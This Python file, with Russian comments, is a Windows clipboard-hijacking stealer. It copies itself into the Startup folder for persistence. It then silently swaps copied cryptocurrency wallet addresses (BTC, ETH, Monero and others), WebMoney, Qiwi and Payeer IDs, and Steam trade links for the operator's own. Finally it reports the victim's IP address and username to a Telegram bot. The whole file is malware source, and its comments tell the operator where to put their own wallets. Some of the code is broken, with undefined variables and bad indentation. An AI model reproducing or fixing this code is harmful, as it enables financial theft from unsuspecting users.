#Подключаем библиотеки:
import win32clipboard
import time
import threading
import os
import sys
import telebot
import shutil
import requests

#Объявляем переменные:
#-----------Telegram BOT-----------#
token = "ТОКЕН"
bot = telebot.TeleBot(token)
#-----------Telegram BOT-----------#


username = os.getlogin()
start = ''

#--------------EDITING--------------#
btc = 'testworking_btc'
eth = 'testworking_eth'
ripple = 'testworking_ripple'
btc_cash = 'testworking_btc_cash'
litecoin = 'testworking_litecoin'
monero = 'testworking_monero'
steamlink = 'steam'
wmr = 'WebRu'
wmz = 'WebDol'
wmx = 'WebBit'
wmu = 'WebUa'
dona = 'donat'
payeer = 'fakePayeer'
qiwime = 'qiwitest'
qiwi = 'number'
#--------------EDITING--------------#
is_first = True
if os.path.isfile(os.getenv("APPDATA") + '\Microsoft\Windows\Start Menu\Programs\Startup' + '\ '[0] + os.path.basename(sys.argv[0])) is False:
    shutil.copy2(sys.argv[0], os.getenv("APPDATA") + '\Microsoft\Windows\Start Menu\Programs\Startup')
else:
    is_first = False

#Если в директории Startup нет нашего файл то запуск считается первым, и соответсвенно мы его туда добавляем.

#Создаём функцию и цикл с названием clipper


def clipper():
    while True:
        win32clipboard.OpenClipboard()
        if win32clipboard.EnumClipboardFormats(win32clipboard.CF_UNICODETEXT) != 0:
            clip_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        if 25 <= len(clip_data) <= 34 and clip_data != btc and clip_data[0] == '1':
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(btc, win32clipboard.CF_UNICODETEXT)
        elif len(clip_data) == 42 and clip_data != eth and clip_data[0:2] == '0x':
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(eth, win32clipboard.CF_UNICODETEXT)
        elif 25 <= len(clip_data) <= 35 and clip_data != ripple and clip_data[0] == 'r':
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(ripple, win32clipboard.CF_UNICODETEXT)
        elif len(clip_data[len(clip_data)-42:len(clip_data)]) == 42 and clip_data != btc_cash and clip_data[len(clip_data)-42:len(clip_data)-41] == 'q':
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(clip_data[0:len(clip_data)-42] + btc_cash, win32clipboard.CF_UNICODETEXT)
        elif len(clip_data) == 34 and clip_data != litecoin and (clip_data[0] == 'L' or clip_data[0] == '3'):
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(litecoin, win32clipboard.CF_UNICODETEXT)
        elif 95 <= len(clip_data) <= 106 and clip_data != monero and clip_data[0] == '4':
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(monero, win32clipboard.CF_UNICODETEXT)
        elif 75 <= len(clip_data) <=76 and clip_data !=steamlink and clip_data[0] == 'h' and clip_data[8] == 's' and clip_data[13] == 'c' and clip_data[27] == 't' and clip_data[36] == 'r':
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(steamlink, win32clipboard.CF_UNICODETEXT)
        elif 74 <= len(clip_data) <=76 and clip_data !=steamlink and clip_data[0] == 'h' and clip_data[8] == 's' and clip_data[13] == 'c' and clip_data[27] == 't' and clip_data[36] == 'r':
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(steamlink1, win32clipboard.CF_UNICODETEXT)
        elif 12<= len(clip_data) <= 13 and clip_data != wmr and clip_data[0] == 'R' or clip_data[0] == 'r':
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(wmr, win32clipboard.CF_UNICODETEXT)
        elif 12<= len(clip_data) <= 13 and clip_data != wmz and clip_data[0] == 'Z' or clip_data[0] == 'z':
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(wmz, win32clipboard.CF_UNICODETEXT)
        elif 12<= len(clip_data) <= 13 and clip_data != wmx and clip_data[0] == 'X' or clip_data[0] == 'x':
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(wmu, win32clipboard.CF_UNICODETEXT)
        elif 12<= len(clip_data) <= 13 and clip_data != wmu and clip_data[0] == 'U' or clip_data[0] == 'u':
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(wmu, win32clipboard.CF_UNICODETEXT)
        elif 37 <= len(clip_data) <= 50 and clip_data !=dona and clip_data[12] == 'd' and clip_data[13] == 'o' and clip_data[14] == 'n' and clip_data[20] == 'a' and clip_data[25] == 's':
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(dona, win32clipboard.CF_UNICODETEXT)
        elif 8 <= len(clip_data) <= 9 and clip_data != payeer and clip_data[0] == 'P' or clip_data[0] == 'p':
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(payeer, win32clipboard.CF_UNICODETEXT)
        elif 10 <= len(clip_data) <= 36 and clip_data !=qiwime and clip_data[0] == 'h' and clip_data[8] == 'q' and clip_data[13] == 'm' and clip_data[14] == 'e':
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(qiwime, win32clipboard.CF_UNICODETEXT)

        win32clipboard.CloseClipboard()
        time.sleep(0.25)

        #первая строка проверяет в буфере обмена кошелёк BTC, таким образом:
        #Если в буфере обмена есть от 25 до 34 (или равным 34) символом, при том что первый символ равен - 1:
        #То выполнять подмены с вашим кошельком (постарался сделать так что-бы было людям понятней)
        #Следующие строки кода:
        #Если в буфере 42 символа и первые два символа равны 0x:
        #То выполнять подмены с вашим эфир кошельком
        #И так с остальными крипто-кошелькамиif 25 <= len(clip_data) <= 34 and clip_data != btc and clip_data[0] == '1':




clipper = threading.Thread(target=clipper)
clipper.start()


start += 'Is first start: ' + str(is_first) + '\n'
r = requests.get('http://ip.42.pl/raw')
ip = r.text

try:
bot.send_message(CHATID, 'New User from: ' + ip + '\nUsername: ' + username + '\nStart: ' + start)
except:
print('.')


